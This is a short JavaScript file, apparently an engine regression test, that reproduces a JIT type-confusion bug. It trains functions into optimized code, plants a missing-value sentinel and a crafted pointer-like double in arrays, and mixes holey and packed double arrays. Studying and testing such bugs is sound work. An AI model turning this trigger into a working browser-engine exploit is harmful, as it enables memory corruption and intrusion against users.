function jit(arg, value){
	for(let i = 0;i < 0x80;i++){
		arg[i] = value;
	}
	return arg;
}

let evil_with_missvalue = [1,2,3,4];
for(let i = 0;i < 0x90;i++){
	evil_with_missvalue[i] = i;
}

for(let i = 0;i < 0x10000;i++){
	jit(evil_with_missvalue, 5);
}

jit(evil_with_missvalue, -524286);

evil_with_missvalue[5] = 3.3;

function jit2(evil, victim){
	[].slice();
	victim[1] = 2.2;
	let res = victim.push(evil[2]);
	victim[2] = 6.17651672645e-312;
}

for(let i = 0;i < 0x10000;i++){
	let darr = [1.1,2.2,3.3];
	delete darr[1];
	let darr_noMissingValue = [1.1,2.2,3.3];
	jit2(darr_noMissingValue, darr);
}

let victim = [1.1,2.2,3.3];
Array.isArray([]);
jit2(evil_with_missvalue, victim);
victim[2];
print("Passed");